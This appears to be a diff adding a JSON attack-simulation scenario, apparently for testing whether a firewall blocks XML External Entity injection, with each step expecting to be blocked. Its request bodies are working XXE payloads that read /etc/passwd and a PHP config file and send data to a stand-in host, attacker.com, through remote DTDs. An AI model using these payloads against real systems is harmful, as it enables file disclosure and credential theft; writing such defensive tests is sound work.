@@ -1,0 +1,151 @@
+{
+  "id": "xxe-injection-xml",
+  "name": "XML External Entity (XXE) Injection",
+  "category": "Injection Attacks",
+  "difficulty": "Advanced",
+  "description": "XML External Entity injection targeting XML parsers through malicious DTD declarations and external entity references",
+  "steps": [
+    {
+      "id": "xxe-recon-1",
+      "name": "XML Endpoint Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/xml/upload"
+      },
+      "execution": {
+        "delayMs": 500
+      }
+    },
+    {
+      "id": "xxe-recon-2",
+      "name": "XML Parser Detection",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "POST",
+        "url": "/api/xml/parse",
+        "headers": {
+          "Content-Type": "application/xml"
+        },
+        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><test>probe</test></root>"
+      },
+      "execution": {
+        "delayMs": 1000
+      },
+      "dependsOn": [
+        "xxe-recon-1"
+      ]
+    },
+    {
+      "id": "xxe-exploit-1",
+      "name": "Basic External Entity",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/xml/process",
+        "headers": {
+          "Content-Type": "application/xml"
+        },
+        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>"
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "xxe-recon-2"
+      ]
+    },
+    {
+      "id": "xxe-exploit-2",
+      "name": "Parameter Entity Injection",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/xml/validate",
+        "headers": {
+          "Content-Type": "application/xml"
+        },
+        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"file:///etc/hosts\"><!ENTITY callhome SYSTEM \"http://attacker.com/?%xxe;\">]><root><exploit>&callhome;</exploit></root>"
+      },
+      "execution": {
+        "delayMs": 2500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "xxe-exploit-1"
+      ]
+    },
+    {
+      "id": "xxe-exploit-3",
+      "name": "Blind XXE with OOB",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/xml/transform",
+        "headers": {
+          "Content-Type": "application/xml"
+        },
+        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;%intern;%trick;]><root><data>test</data></root>"
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "xxe-exploit-2"
+      ]
+    },
+    {
+      "id": "xxe-exploit-4",
+      "name": "SOAP XXE Injection",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/soap/service",
+        "headers": {
+          "Content-Type": "text/xml; charset=utf-8",
+          "SOAPAction": "\"http://tempuri.org/GetUserData\""
+        },
+        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetUserData><userId>&xxe;</userId></GetUserData></soap:Body></soap:Envelope>"
+      },
+      "execution": {
+        "delayMs": 3500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "xxe-exploit-3"
+      ]
+    },
+    {
+      "id": "xxe-exfil-1",
+      "name": "Data Exfiltration via XXE",
+      "stage": "exfiltration",
+      "request": {
+        "method": "POST",
+        "url": "/api/xml/import",
+        "headers": {
+          "Content-Type": "application/xml"
+        },
+        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/config.php\"><!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">%remote;%intern;%send;]><root><import>data</import></root>"
+      },
+      "execution": {
+        "delayMs": 4000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "xxe-exploit-4"
+      ]
+    }
+  ]
+}
